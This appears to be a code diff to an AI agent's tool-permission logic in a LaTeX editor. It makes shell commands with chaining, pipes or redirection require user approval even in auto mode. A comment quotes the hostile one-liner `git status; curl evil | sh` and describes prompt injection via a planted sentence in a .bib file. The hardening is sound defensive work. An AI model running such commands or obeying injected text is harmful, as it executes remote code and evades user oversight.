@@ -104,6 +104,27 @@ READ_ONLY_TOOLS = [
 # stays there.  Inside the project these are free; outside they ask.
 READING_TOOLS = frozenset({"Read", "NotebookRead", "Glob", "Grep"})
 
+# Shell calls auto mode does not cover, however firmly it is switched on.
+#
+# `Bash` is not a write tool, so it fell past the write branch straight to
+# the bare `if self.auto` and was approved with no card at all.  Blocking it
+# outright is the wrong correction: running `latexmk` without being asked is
+# most of what auto mode is *for* in a LaTeX editor, and two tests use
+# exactly that as the canonical example.
+#
+# The line to draw is the one `_rule_for` already draws, for the reason it
+# already gives: a command carrying shell syntax is not one command, so no
+# rule can honestly describe it, and `git status; curl evil | sh` starts with
+# `git`.  A call auto mode cannot write a rule for is a call it should not be
+# approving in silence either.  So the ordinary `latexmk` keeps working, and
+# the chained, piped, substituted or redirected command -- which is how an
+# injected sentence in somebody else's `.bib` file escalates -- gets a card
+# even in auto mode.
+def _auto_covers(tool_name: str, rule: str) -> bool:
+    if tool_name in ("Bash", "BashOutput", "KillShell"):
+        return bool(rule)
+    return True
+
 _HOW_TO_WORK = """\
 You are helping write and maintain a document in NextTex, a LaTeX editor.
 
@@ -556,10 +577,10 @@ class ProjectAgent:
             # while a card is already on screen never answers it: the writer
             # is looking at that card, and having it resolve itself under
             # their cursor is what the click shield exists to prevent.
-            await self._settled(
-                tool_name, tool_input, self._rule_for(tool_name, tool_input), "auto"
-            )
-            return self._allow("Approved automatically.")
+            rule = self._rule_for(tool_name, tool_input)
+            if _auto_covers(tool_name, rule):
+                await self._settled(tool_name, tool_input, rule, "auto")
+                return self._allow("Approved automatically.")
 
         decision = await self._ask_user(tool_name, tool_input)
         if decision in {"allow", "always"}:
